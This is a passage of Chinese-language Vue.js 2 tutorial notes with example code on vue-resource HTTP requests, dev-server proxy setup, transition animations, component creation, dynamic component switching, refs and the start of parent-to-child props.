          this.$http.get('http://vue.studyit.io/api/getlunbo').then(function (result) {
            // 通过 result.body 拿到服务器返回的成功的数据
            // console.log(result.body)
          })
        },
        postInfo() { // 发起 post 请求   application/x-wwww-form-urlencoded
          //  手动发起的 Post 请求，默认没有表单格式，所以，有的服务器处理不了
          //  通过 post 方法的第三个参数， { emulateJSON: true } 设置 提交的内容类型 为 普通表单数据格式
          this.$http.post('http://vue.studyit.io/api/post', {}, { emulateJSON: true }).then(result => {
            console.log(result.body)
          })
        },
        jsonpInfo() { // 发起JSONP 请求
          this.$http.jsonp('http://vue.studyit.io/api/jsonp').then(result => {
            console.log(result.body)
          })
        }
      }
    });
  </script>
</body>

</html>
```
>[danger] ##### 使用axios -- 基于promise 封装的库
```
1.去看文档就能学会这个
```
>[danger] ##### 做跨域在vue脚手架config/index.js 做配置
```
//配置反向代理的地方
    proxyTable: {
      //只要/v4/* 全部转发到m.maizuo.com
          '/v4': {
              target: 'https://m.maizuo.com',
              host: 'm.maizuo.com',
              changeOrigin:true,
              // pathRewrite: {
              //     '^/v4/api': '/v4/api'
              //   }
          },
          "/v2":{
            target: 'https://m.maizuo.com',
            host: 'm.maizuo.com',
            changeOrigin:true,
          }

          //  https://m.maizuo.com/v4/api/film/now-playing?__t=1532675055022&page=1&count=5
    },
```
>[success] # Vue异步请求
```
1.首先使用vue-resource-1.3.4.js 包
2.根据Vue的生命周期 ，当查询页面加载时给在created 实例生成
```
>[danger] ##### 案例
```
1.配置resource全局配置了，请求的数据接口 根域名    Vue.http.options.root = 'http://vue.studyit.io/';
2.全局启用 emulateJSON 选项Vue.http.options.emulateJSON = true;，就是当post 的时候不用在添加第三个参数
```
* 获取所有数据分析思路
```
1. 由于已经导入了 Vue-resource这个包，所以 ，可以直接通过  this.$http 来
发起数据请求
2. 根据接口API文档，知道，获取列表的时候，应该发起一个 get 请求

3. this.$http.get('url').then(function(result){})
4. 当通过 then 指定回调函数之后，在回调函数中，可以拿到数据服务器返回的 result
5. 先判断 result.status 是否等于0，如果等于0，就成功了，可以 把 
result.message 赋值给 this.list ; 如果不等于0，可以弹框提醒，获取数据失败！
```
* 添加数据分析思路
```
1. 听过查看 数据API接口，发现，要发送一个 Post 请求，  this.$http.post
2. this.$http.post() 中接收三个参数：
    2.1 第一个参数： 要请求的URL地址
    2.2 第二个参数： 要提交给服务器的数据 ，要以对象形式提交给服务器 { name: this.name }
    2.3 第三个参数： 是一个配置对象，要以哪种表单数据类型提交过去， { emulateJSON: true }, 以普通表单格式，将数据提交给服务器 application/x-www-form-urlencoded
3. 在 post 方法中，使用 .then 来设置成功的回调函数，如果想要拿到成功的结果，需要 result.body
```
* 案例代码
```
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <meta http-equiv="X-UA-Compatible" content="ie=edge">
    <title>Document</title>
    <script src="./lib/vue-2.4.0.js"></script>
    <script src="./lib/vue-resource-1.3.4.js"></script>
    <link rel="stylesheet" href="./lib/bootstrap-3.3.7.css">
</head>

<body>
<div id="app">



    <div class="panel panel-primary">
        <div class="panel-heading">
            <h3 class="panel-title">添加品牌</h3>
        </div>
        <div class="panel-body form-inline">

            <label>
                Name:
                <input type="text" v-model="name" class="form-control">
            </label>

            <input type="button" value="添加" @click="add" class="btn btn-primary">
        </div>
    </div>



    <table class="table table-bordered table-hover table-striped">
        <thead>
        <tr>
            <th>Id</th>
            <th>Name</th>
            <th>Ctime</th>
            <th>Operation</th>
        </tr>
        </thead>
        <tbody>
        <tr v-for="item in list" :key="item.id">
            <td>{{item.id}}</td>
            <td>{{item.name}}</td>
            <td>{{item.ctime}}</td>
            <td>
                <a href="" @click.prevent="del(item.id)">删除</a>
            </td>
        </tr>
        </tbody>
    </table>


</div>

<script>
    // 如果我们通过全局配置了，请求的数据接口 根域名，则 ，在每次单独发起 http 请求的时候，请求的 url 路径，应该以相对路径开头，前面不能带 /  ，否则 不会启用根路径做拼接；
    Vue.http.options.root = 'http://vue.studyit.io/';
    // 全局启用 emulateJSON 选项
    Vue.http.options.emulateJSON = true;

    // 创建 Vue 实例，得到 ViewModel
    var vm = new Vue({
        el: '#app',
        data: {
            name: '',
            list: [ // 存放所有品牌列表的数组
            ]
        },
        created() { // 当 vm 实例 的 data 和 methods 初始化完毕后，vm实例会自动执行created 这个生命周期函数
            this.getAllList()
        },
        methods: {
            getAllList() { // 获取所有的品牌列表
                this.$http.get('api/getprodlist').then(result => {
                    // 注意： 通过 $http 获取到的数据，都在 result.body 中放着
                    var result = result.body
                    if (result.status === 0) {
                        // 成功了
                        this.list = result.message
                    } else {
                        // 失败了
                        alert('获取数据失败！')
                    }
                })
            },
            add() {  // 添加品牌列表到后台服务器
                //没有配置 的话就给添加参数{ emulateJSON: true }
                /* this.$http.post('api/addproduct', { name: this.name }, { emulateJSON: true }).then(result => {
                  if (result.body.status === 0) {
                    // 成功了！
                    // 添加完成后，只需要手动，再调用一下 getAllList 就能刷新品牌列表了
                    this.getAllList()
                    // 清空 name
                    this.name = ''
                  } else {
                    // 失败了
                    alert('添加失败！')
                  }
                }) */

                this.$http.post('api/addproduct', { name: this.name }).then(result => {
                    if (result.body.status === 0) {
                        // 成功了！
                        // 添加完成后，只需要手动，再调用一下 getAllList 就能刷新品牌列表了
                        this.getAllList()
                        // 清空 name
                        this.name = ''
                    } else {
                        // 失败了
                        alert('添加失败！')
                    }
                })
            },
            del(id) { // 删除品牌
                this.$http.get('api/delproduct/' + id).then(result => {
                    if (result.body.status === 0) {
                        // 删除成功
                        this.getAllList()
                    } else {
                        alert('删除失败！')
                    }
                })
            }
        }
    });
</script>
</body>

</html>
```
[TOC]
>[success] # [Vue中的动画](https://cn.vuejs.org/v2/guide/transitions.html)
```
1.为什么要有动画：动画能够提高用户的体验，帮助用户更好的理解页面中的功能；
2.vue将动画拆解成两部分，一个是进入的时候，一个是离开的时候，每个部
分中又分两个小节，因此v-enter 和 v-leave-to 等同，v-enter-to 和 v-enter等同
3.每次点击当现实的时候，会自动加上两个样式v-enter 和v-enter-active，离开时会加上 v-leave-to和 v-leave-active 一组的效果
4.单元素/组件过渡
		* css过渡
		* css动画
		* 结合animate动画库 appear 
```
![](https://box.kancloud.cn/b77298904af55f21828119520020993e_626x247.png)
>[success] # 做一个标签类隐藏的动画效果
```
1.可以使用 第三方动画包animate.css
2.可以配合使用第三方 JavaScript 动画库，如 Velocity.js
```
>[danger] ##### 不是使用动画
```
1.第一种自己想的方法给按钮绑定事件控制，开关按钮的变更
```
* 第一种
```
    <script src="./lib/vue-2.4.0.js"></script>

</head>
<body>
<div id="app">
    <input type="button" value="隐藏" @click="toggle">
    <p v-if="flag"> 显示隐藏</p>
</div>
</body>
<script>
    var vm = new Vue({
        el:"#app",
        data:{
            flag:true
        },
        methods:{
            toggle(){
                this.flag = this.flag? false:true
            }
        },
    })
</script>
</html>
```
* 精简案例
```
    <script src="./lib/vue-2.4.0.js"></script>
</head>

<body>
<div id="app">
    <input type="button" value="toggle" @click="flag=!flag">
    <!-- 需求： 点击按钮，让 h3 显示，再点击，让 h3 隐藏 -->
    <h3 v-if="flag">这是一个H3</h3>
</div>

<script>
    // 创建 Vue 实例，得到 ViewModel
    var vm = new Vue({
        el: '#app',
        data: {
            flag: false
        },
        methods: {}
    });
</script>
</body>

</html>
```
>[danger] ##### 使用vue 的动画效果反复交替
```
1.动画是反复交替的，也就是整体构成会有两次
2.下面的动画就是第一次点击冲150px 的地方从隐藏到显示 在到0px
3.再次点击动画会进行第二次的交替效果正好相反，从0 到150px
4.第一步 编写样式 由于动画效果成对出现.v-enter,v-leave-to分别是元素起
始状态，和元素的离开终止状态
5.v-enter-active，v-leave-active 是入场结束和入场离开动画
6.每次点击当现实的时候，会自动加上两个样式v-enter 和v-enter-active，离开时会加上 v-leave-to和 v-leave-active 一组的效果
```
* 案例
```
1.第一步用transition 元素，把 需要被动画控制的元素，包裹起来
2.第二步编写样式
```
```
    <script src="./lib/vue-2.4.0.js"></script>
    <!-- 2. 自定义两组样式，来控制 transition 内部的元素实现动画 -->
    <style>
        /* v-enter 【这是一个时间点】 是进入之前，元素的起始状态，此时还没有开始进入 */
        /* v-leave-to 【这是一个时间点】 是动画离开之后，离开的终止状态，此时，元素 动画已经结束了 */
        .v-enter,
        .v-leave-to {
            opacity: 0;
            transform: translateX(150px);
        }

        /* v-enter-active 【入场动画的时间段】 */
        /* v-leave-active 【离场动画的时间段】 */
        .v-enter-active,
        .v-leave-active{
            transition: all 0.8s ease;
        }
    </style>
</head>

<body>
<div id="app">
    <input type="button" value="toggle" @click="flag=!flag">
    <!-- 1. 使用 transition 元素，把 需要被动画控制的元素，包裹起来 -->
    <transition>
        <h3 v-if="flag">这是一个H3</h3>
    </transition>
</div>

<script>
    // 创建 Vue 实例，得到 ViewModel
    var vm = new Vue({
        el: '#app',
        data: {
            flag: false
        },
        methods: {}
    });
</script>
</body>

</html>
```
>[danger] ##### 利用html5关键帧动画效果代码
```
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Title</title>
    <script type="text/javascript" src="lib/vue.js"></script>
    <style>
        .bounce-enter-active {
            animation: bounce-in .5s;
        }
        /*reverse 倒过来执行下面关键帧动画效果*/
        .bounce-leave-active {
            animation: bounce-in .5s reverse;
        }
        @keyframes bounce-in {
            0% {
                transform: translateX(100px);
                opacity: 0;
            }

            100% {
                transform: translateX(0px);
                opacity: 1;
            }
        }
    </style>

</head>
<body>
<div id="app">
    <input type="button" @click="flag =!flag" value="点击">

    <transition name="bounce">
        <ul v-show="flag">
            <li>111</li>
        </ul>
    </transition>
</div>
<script>
    var vm = new Vue({
        el: '#app',
        data: {
            flag: false
        },
        methods: {},
        components: {}
    })
</script>
</body>
</html>
```
>[danger] ##### 指定专属动画效果
```
1.在被包裹的transition 加那么属性
2.使用的时候 加对应的name 前缀
```
```
  <script src="./lib/vue-2.4.0.js"></script>
  <!-- 2. 自定义两组样式，来控制 transition 内部的元素实现动画 -->
  <style>
    /* v-enter 【这是一个时间点】 是进入之前，元素的起始状态，此时还没有开始进入 */
    /* v-leave-to 【这是一个时间点】 是动画离开之后，离开的终止状态，此时，元素 动画已经结束了 */
    .v-enter,
    .v-leave-to {
      opacity: 0;
      transform: translateX(150px);
    }

    /* v-enter-active 【入场动画的时间段】 */
    /* v-leave-active 【离场动画的时间段】 */
    .v-enter-active,
    .v-leave-active{
      transition: all 0.8s ease;
    }
    

    .my-enter,
    .my-leave-to {
      opacity: 0;
      transform: translateY(70px);
    }

    .my-enter-active,
    .my-leave-active{
      transition: all 0.8s ease;
    }
  </style>
</head>

<body>
  <div id="app">
    <input type="button" value="toggle" @click="flag=!flag">
    <!-- 需求： 点击按钮，让 h3 显示，再点击，让 h3 隐藏 -->
    <!-- 1. 使用 transition 元素，把 需要被动画控制的元素，包裹起来 -->
    <!-- transition 元素，是 Vue 官方提供的 -->
    <transition>
      <h3 v-if="flag">这是一个H3</h3>
    </transition>


    <hr>

    <input type="button" value="toggle2" @click="flag2=!flag2">
    <transition name="my">
      <h6 v-if="flag2">这是一个H6</h6>
    </transition>
  </div>

  <script>
    // 创建 Vue 实例，得到 ViewModel
    var vm = new Vue({
      el: '#app',
      data: {
        flag: false,
        flag2: false
      },
      methods: {}
    });
  </script>
</body>

</html>
```
>[danger] ##### 使用第三方样式包animate.css
```
1. 去官网找对应的animate动画效果即可
```
```
  <script src="./lib/vue-2.4.0.js"></script>
  <link rel="stylesheet" href="./lib/animate.css">
  <!-- 入场 bounceIn    离场 bounceOut -->
</head>

<body>
  <div id="app">
    <input type="button" value="toggle" @click="flag=!flag">
    <!-- 需求： 点击按钮，让 h3 显示，再点击，让 h3 隐藏 -->
    <!-- <transition enter-active-class="animated bounceIn" leave-active-class="animated bounceOut">
      <h3 v-if="flag">这是一个H3</h3>
    </transition> -->

    <!-- 使用 :duration="毫秒值" 来统一设置 入场 和 离场 时候的动画时长 -->
    <!-- <transition enter-active-class="bounceIn" leave-active-class="bounceOut" :duration="200">
      <h3 v-if="flag" class="animated">这是一个H3</h3>
    </transition> -->

    <!-- 使用  :duration="{ enter: 200, leave: 400 }"  来分别设置 入场的时长 和 离场的时长  -->
    <transition 
    enter-active-class="bounceIn" 
    leave-active-class="bounceOut" 
    :duration="{ enter: 200, leave: 400 }">
      <h3 v-if="flag" class="animated">这是一个H3</h3>
    </transition> 
  </div>

  <script>
    // 创建 Vue 实例，得到 ViewModel
    var vm = new Vue({
      el: '#app',
      data: {
        flag: false
      },
      methods: {}
    });
  </script>
</body>

</html>
```
>[danger] ##### 半程动画使用钩子
<a href=https://cn.vuejs.org/v2/guide/transitions.html#JavaScript-%E9%92%A9%E5%AD%90> 让动画只去不回</a>
```
1. 使用 transition 元素把 小球包裹起来 
2. 使用动画函数的钩子函数
```
```
 <script src="./lib/vue-2.4.0.js"></script>
  <style>
    .ball {
      width: 15px;
      height: 15px;
      border-radius: 50%;
      background-color: red;
    }
  </style>
</head>

<body>
  <div id="app">
    <input type="button" value="快到碗里来" @click="flag=!flag">
    <!-- 1. 使用 transition 元素把 小球包裹起来 -->
    <transition
      @before-enter="beforeEnter"
      @enter="enter"
      @after-enter="afterEnter">
      <div class="ball" v-show="flag"></div>
    </transition>
  </div>

  <script>

    // 创建 Vue 实例，得到 ViewModel
    var vm = new Vue({
      el: '#app',
      data: {
        flag: false
      },
      methods: {
        // 注意： 动画钩子函数的第一个参数：el，表示 要执行动画的那个DOM元素，是个原生的 JS DOM对象
        // 大家可以认为 ， el 是通过 document.getElementById('') 方式获取到的原生JS DOM对象
        beforeEnter(el){
          // beforeEnter 表示动画入场之前，此时，动画尚未开始，可以 在 beforeEnter 中，设置元素开始动画之前的起始样式
          // 设置小球开始动画之前的，起始位置
          el.style.transform = "translate(0, 0)"
        },
        enter(el, done){
          // 这句话，没有实际的作用，但是，如果不写，出不来动画效果；
          // 可以认为 el.offsetWidth 会强制动画刷新
          el.offsetWidth
          // enter 表示动画 开始之后的样式，这里，可以设置小球完成动画之后的，结束状态
          el.style.transform = "translate(150px, 450px)"
          el.style.transition = 'all 1s ease'

          // 这里的 done， 起始就是 afterEnter 这个函数，也就是说：done 是 afterEnter 函数的引用
          done()
        },
        afterEnter(el){
          // 动画完成之后，会调用 afterEnter
          // console.log('ok')
          // 这句话， 第一个功能，是控制小球的显示与隐藏
          // 第二个功能： 直接跳过后半场动画，让 flag 标识符 直接变为 false
          // 当第二次再点击 按钮的时候， flag  false  ->    true
          this.flag = !this.flag
          // el.style.opacity = 0.5

          // Vue 把一个完整的动画，使用钩子函数，拆分为了两部分：
          // 我们使用 flag 标识符，来表示动画的切换；
          // 刚以开始，flag = false  ->   true   ->   false
        }
      }
    });
  </script>
</body>

</html>
```
>[danger] ##### 列表入场动画
```
1.多个元素过渡(设置key)
当有相同标签名的元素切换时，需要通过 key 特性设置唯一的值来标记以让 
Vue 区分它们，否则 Vue 为了效率只会替换相同标签内部的内容。
mode:in-out ; out-in
2.列表过渡(设置key)<transition-group>不同于 transition， 它会以一个真实
元素呈现：默认为一个 <span>。你也可以通过 tag 特性更换为其他元素。
提供唯一的 key 属性值
```
```
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Document</title>
  <script src="./lib/vue-2.4.0.js"></script>
  <style>
    li {
      border: 1px dashed #999;
      margin: 5px;
      line-height: 35px;
      padding-left: 5px;
      font-size: 12px;
      width: 100%;
    }

    li:hover {
      background-color: hotpink;
      transition: all 0.8s ease;
    }

    .v-enter,
    .v-leave-to {
      opacity: 0;
      transform: translateY(80px);
    }

    .v-enter-active,
    .v-leave-active {
      transition: all 0.6s ease;
    }

    /* 下面的 .v-move 和 .v-leave-active 配合使用，能够实现列表后续的元素，渐渐地漂上来的效果 */
    .v-move {
      transition: all 0.6s ease;
    }
    .v-leave-active{
      position: absolute;
    }
  </style>
</head>

<body>
  <div id="app">

    <div>
      <label>
        Id:
        <input type="text" v-model="id">
      </label>

      <label>
        Name:
        <input type="text" v-model="name">
      </label>

      <input type="button" value="添加" @click="add">
    </div>

    <!-- <ul> -->
      <!-- 在实现列表过渡的时候，如果需要过渡的元素，是通过 v-for 循环渲染出来的，不能使用 transition 包裹，需要使用 transitionGroup -->
      <!-- 如果要为 v-for 循环创建的元素设置动画，必须为每一个 元素 设置 :key 属性 -->
      <!-- 给 ransition-group 添加 appear 属性，实现页面刚展示出来时候，入场时候的效果 -->
      <!-- 通过 为 transition-group 元素，设置 tag 属性，指定 transition-group 渲染为指定的元素，如果不指定 tag 属性，默认，渲染为 span 标签 -->
      <transition-group appear tag="ul">
        <li v-for="(item, i) in list" :key="item.id" @click="del(i)">
          {{item.id}} --- {{item.name}}
        </li>
      </transition-group>
    <!-- </ul> -->

  </div>

  <script>
    // 创建 Vue 实例，得到 ViewModel
    var vm = new Vue({
      el: '#app',
      data: {
        id: '',
        name: '',
        list: [
          { id: 1, name: '赵高' },
          { id: 2, name: '秦桧' },
          { id: 3, name: '严嵩' },
          { id: 4, name: '魏忠贤' }
        ]
      },
      methods: {
        add() {
          this.list.push({ id: this.id, name: this.name })
          this.id = this.name = ''
        },
        del(i) {
          this.list.splice(i, 1)
        }
      }
    });
  </script>
</body>

</html>
```
[TOC]
>[success] # Vue 的组件
```
1.VUE的组件，就是为了拆分Vue实例的代码量的，能够让我们以不同的组件，来划分不同的功能模块，将来我们需要什么样的功能，就可以去调用对应的组件即可；
2.组件化和模块化
 模块化： 是从代码逻辑的角度进行划分的；方便代码分层开发，保证每个功能模块的职能单一；
 组件化： 是从UI界面的角度进行划分的；前端的组件化，方便UI组件的重用；
```
>[danger] ##### VUE组件注意点
```
1.不论是哪种方式创建出来的组件,组件的 template 属性指向的模板内容,必须有且只能有唯一的一个根元素
```
>[danger] ##### 组件的缩写
```
1.下面还可以将template除了利用自变量，也可用html导入写法
2.注意在局部使用的时候，引入字面量，就会自动形成默认key
```
```
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Document</title>
  <script src="./lib/vue-2.4.0.js"></script>
</head>

<body>
  <div id="app">
    <!-- <mylogin></mylogin> -->
    <login></login>
  </div>

  <script>

    // 定义组件的时候，如果要定义全局的组件， Vue.component('组件的名称', {})

    // 通过 对象 字面量的形式， 定义了一个 组件模板对象
    var login = {
      template: '<h1>1234</h1>'
    }
    //  通过  Vue.component 把 组件模板对象，注册为一个全局的Vue 组件，同时，为这个组件起了一个名称，可以让我们  通过 标签形式，在页面中直接引入这个组件
    // Vue.component('mylogin', login)

    // 创建 Vue 实例，得到 ViewModel
    var vm = new Vue({
      el: '#app',
      data: {},
      methods: {},
      components: {
        // '组件的名称': 组件的模板对象
        // 'mylogin': login
        login
      }
    });
  </script>
</body>

</html>
```
>[success] # 全局创建组件
```
1.下面第一种最原始的写法，第二种将组件合并写法，推荐第三种全部提取
写法拆分效果好
```
>[danger] ##### 创建组件第一种方法  -- Vue.extend
```
1.使用 Vue.extend 配合 Vue.component 方法
2.使用 Vue.extend 来创建全局的Vue组件
3.使用Vue.component('组件的名称', 创建出来的组件模板对象)
4.如果使用 Vue.component 定义全局组件的时候，组件名称使用了 驼峰命
名，则在引用组件的时候，需要把 大写的驼峰改为小写的字母，同时，两个单词之前，使用 - 链接；
5.如果不使用驼峰,则直接拿名称来使用即可;
6.Vue.component 第一个参数:组件的名称,将来在引用组件的时候,就是一个 标签形式 来引入 它的
7.第二个参数: Vue.extend 创建的组件  ,其中 template 就是组件将来要展示的HTML内容
```
* 案例
```
    <script src="./lib/vue-2.4.0.js"></script>

</head>
<body>
<div id="app">
    <my-Com1></my-Com1>
</div>

<script>
    var com1 = Vue.extend({
        template:"<h3>使用extend创建组件</h3>"
    })
    Vue.component('myCom1',com1)

    var vm = new Vue({
        el:"#app",
        data:{},
        menthods:{},
    })
</script>
</body>
</html>
```
>[danger] ##### 创建组件的方法二 --  直接使用 Vue.component 方法
```
1.方法二是根据方法一变更的，方法一中的component第二个参数是组件模
板对象，所以可以直接吧模板对象写简写
```
* 案例
```
    <script src="./lib/vue-2.4.0.js"></script>

</head>
<body>
<div id="app">
    <my-Com1></my-Com1>
</div>

<script>
    // 完美缩写方法
    Vue.component('myCom1',{
        template:"<h3>使用extend创建组件</h3>"
    })

     // Vue.component('myCom1',Vue.extend({
    //     template:"<h3>使用extend创建组件</h3>"
    // }))

    var vm = new Vue({
        el:"#app",
        data:{},
        menthods:{},
    })
</script>
</body>
</html>
 

```
>[danger] ##### 创建组件的第三个方法 -- 将模板字符串，定义到script标签种
```
1.将template标签内容提取出来，在绑定上
```
```
    <script src="./lib/vue-2.4.0.js"></script>
</head>
<body>
<div id="app">
    <my-com1></my-com1>
</div>

<!-- 在 被控制的 #app 外面,使用 template 元素,定义组件的HTML模板结构  -->
<template id="tmpl">
    <div>
        <h1>这是通过 template 元素,在外部定义的组件结构,这个方式,有代码的只能提示和高亮</h1>
        <h4>好用,不错!</h4>
    </div>
</template>

<script>
   
    Vue.component('myCom1',{
        template:"#tmpl"
    })

    var vm = new Vue({
        el:"#app",
        data:{},
        menthods:{},
    })
</script>
</body>
</html>
```

>[success] # 创建局部组件
```
1.局部组件只能在指定创建的Vue对象中使用
2.使用的时候使用components 调用局部组件
```
>[danger] ##### 创建局部组件案例
```
1.使用vue对象中的components，其中components里面也是一个对象，对象
中的k是组件的自定义名称
```
```
    <script src="./lib/vue-2.4.0.js"></script>
</head>
<body>
<div id="app">
    <my-com1></my-com1>
</div>
<!-- 在 被控制的 #app 外面,使用 template 元素,定义组件的HTML模板结构  -->
<template id="tmpl">
    <div>
        <h1>这是通过 template 元素,在外部定义的组件结构,这个方式,有代码的只能提示和高亮</h1>
        <h4>好用,不错!</h4>
    </div>
</template>
<script>
    var vm = new Vue({
        el:"#app",
        data:{},
        menthods:{},
        components:{
            myCom1:{
                template:'#tmpl'
            }
        }
    })
</script>
</body>
</html>
```
>[success] # 在组件中使用data 数据
```
1.组件中的data 不是一个对象，而是一个方法，且是方法的返回值
```
>[danger] ##### 全局组件的data 使用
```
    <script src="./lib/vue-2.4.0.js"></script>

</head>
<body>
<div id="app">
    <my-coml></my-coml>
</div>

<!-- 在 被控制的 #app 外面,使用 template 元素,定义组件的HTML模板结构  -->
<template id="tmpl">
    <div>
        <h4>{{msg}}</h4>
    </div>
</template>

<script>
    Vue.component('myComl',{
        template:"#tmpl",
        data:function () {
            return{
                msg:"这个data 是个方法"
            }
        }
    })

    var vm = new Vue({
        el:"#app",
        data:{},
        menthods:{},
    })
</script>
</body>
</html>
```
>[danger] ##### 局部data的使用
```
    <script src="./lib/vue-2.4.0.js"></script>

</head>
<body>
<div id="app">
    <my-coml></my-coml>
</div>

<!-- 在 被控制的 #app 外面,使用 template 元素,定义组件的HTML模板结构  -->
<template id="tmpl">
    <div>
        <h4>{{msg}}</h4>
    </div>
</template>

<script>


    var vm = new Vue({
        el:"#app",
        data:{},
        menthods:{},
        components:{
            myComl:{
                template:"#tmpl",
                data:function () {
                    return{
                        msg:"这个data 是个方法"
                    }
            }
        }
    }
    })
</script>
</body>
</html>
```
>[danger] ##### 为什么组件中的data 是个方法
```
1.组件中的data 是一个方法，切必须是一个返回值，因为组件如果是全局的变量data，会导致所有组件公用一个data
```
```
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Document</title>
  <script src="./lib/vue-2.4.0.js"></script>
</head>

<body>
  <div id="app">
    <counter></counter>
    <hr>
    <counter></counter>
    <hr>
    <counter></counter>
  </div>


  <template id="tmpl">
    <div>
      <input type="button" value="+1" @click="increment">
      <h3>{{count}}</h3>
    </div>
  </template>

  <script>
    var dataObj = { count: 0 }

    // 这是一个计数器的组件, 身上有个按钮,每当点击按钮,让 data 中的 count 值 +1
    Vue.component('counter', {
      template: '#tmpl',
      data: function () {
        // return dataObj
        return { count: 0 }
      },
      methods: {
        increment() {
          this.count++
        }
      }
    })

    // 创建 Vue 实例，得到 ViewModel
    var vm = new Vue({
      el: '#app',
      data: {},
      methods: {}
    });
  </script>
</body>

</html>
```
[TOC]

 
>[success] # 利用组价做切换效果显示
```
1.v-if
2.使用component 来切换
```
>[danger] ##### 方法一了用v-if
```
1.只能切换两组组件显示隐藏
```
```
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Document</title>
  <script src="./lib/vue-2.4.0.js"></script>
</head>

<body>
  <div id="app">
    <a href="" @click.prevent="flag=true">登录</a>
    <a href="" @click.prevent="flag=false">注册</a>

    <login v-if="flag"></login>
    <register v-else="flag"></register>

  </div>

  <script>
    Vue.component('login', {
      template: '<h3>登录组件</h3>'
    })

    Vue.component('register', {
      template: '<h3>注册组件</h3>'
    })

    // 创建 Vue 实例，得到 ViewModel
    var vm = new Vue({
      el: '#app',
      data: {
        flag: false
      },
      methods: {}
    });
  </script>
</body>

</html>
```
>[danger] ##### 使用提供的component 标签切换
```
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Document</title>
  <script src="./lib/vue-2.4.0.js"></script>
</head>

<body>
  <div id="app">
    <a href="" @click.prevent="comName='login'">登录</a>
    <a href="" @click.prevent="comName='register'">注册</a>

    <!-- Vue提供了 component ,来展示对应名称的组件 -->
    <!-- component 是一个占位符, :is 属性,可以用来指定要展示的组件的名称 -->
    <component :is="comName"></component>

    <!-- 总结:当前学习了几个 Vue 提供的标签了??? -->
    <!-- component,  template,  transition,  transitionGroup  -->

  </div>

  <script>
    // 组件名称是 字符串
    Vue.component('login', {
      template: '<h3>登录组件</h3>'
    })

    Vue.component('register', {
      template: '<h3>注册组件</h3>'
    })

    // 创建 Vue 实例，得到 ViewModel
    var vm = new Vue({
      el: '#app',
      data: {
        comName: 'login' // 当前 component 中的 :is 绑定的组件的名称
      },
      methods: {}
    });
  </script>
</body>

</html>
```
>[success] # 组件切换的动画效果
```
1.mode="out-in" 是组件特有的效果
```
>[danger] ##### 代码
```
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Document</title>
  <script src="./lib/vue-2.4.0.js"></script>
  <style>
    .v-enter,
    .v-leave-to {
      opacity: 0;
      transform: translateX(150px);
    }

    .v-enter-active,
    .v-leave-active {
      transition: all 0.5s ease;
    }
  </style>
</head>

<body>
  <div id="app">
    <a href="" @click.prevent="comName='login'">登录</a>
    <a href="" @click.prevent="comName='register'">注册</a>

    <!-- 通过 mode 属性,设置组件切换时候的 模式 -->
    <transition mode="out-in">
      <component :is="comName"></component>
    </transition>

  </div>

  <script>
    // 组件名称是 字符串
    Vue.component('login', {
      template: '<h3>登录组件</h3>'
    })

    Vue.component('register', {
      template: '<h3>注册组件</h3>'
    })

    // 创建 Vue 实例，得到 ViewModel
    var vm = new Vue({
      el: '#app',
      data: {
        comName: 'login' // 当前 component 中的 :is 绑定的组件的名称
      },
      methods: {}
    });
  </script>
</body>

</html>
```
>[success] # 获取dom 对象
```
1.在要获取的标签上备注ref 自定义属性
2.通过this.$refs.属性名称获取
3.利用this.$ref 也可以获取到对应子组件的data 和 methods 里面的属性和方法
```
>[danger] ##### 案例
```
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Document</title>
  <script src="./lib/vue-2.4.0.js"></script>
</head>

<body>
  <div id="app">
    <input type="button" value="获取元素" @click="getElement" ref="mybtn">

    <h3 id="myh3" ref="myh3">哈哈哈， 今天天气太好了！！！</h3>

    <hr>

    <login ref="mylogin"></login>
  </div>

  <script>

    var login = {
      template: '<h1>登录组件</h1>',
      data() {
        return {
          msg: 'son msg'
        }
      },
      methods: {
        show() {
          console.log('调用了子组件的方法')
        }
      }
    }

    // 创建 Vue 实例，得到 ViewModel
    var vm = new Vue({
      el: '#app',
      data: {},
      methods: {
        getElement() {
          // console.log(document.getElementById('myh3').innerText)

          //  ref  是 英文单词 【reference】   值类型 和 引用类型  referenceError
          // console.log(this.$refs.myh3.innerText)

          // console.log(this.$refs.mylogin.msg)
          // this.$refs.mylogin.show()
        }
      },
      components: {
        login
      }
    });
  </script>
</body>

</html>
```
>[success]# 父组件向子组件传值
```
1.所谓父组件就是定义的对应全局Vue对象，子组件就是使用components属性
创建的局部template 模板
2.两者关系，父组件包含子组件，所以使用的时候现在，子组件调用的模板声明父组件传入的data
3.在子组件利用props 让父子组件的data 形成关联调用
4.在vue中只有加前缀v-bind 才能识别true/flase ，不加都会当字符串处理
show="true"  :show = "true"
5.prop验证 props:{name:Number} Number,String,Boolean,Array,Object,Function,
```
>[danger] ##### 案例
```
1.在调用子组件的时候用v-bind 绑定父组件data，让子组件接收
2.子组件利用props 属性接收
3.子组件调用props传来的父组件data
```
```
<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <title>Document</title>
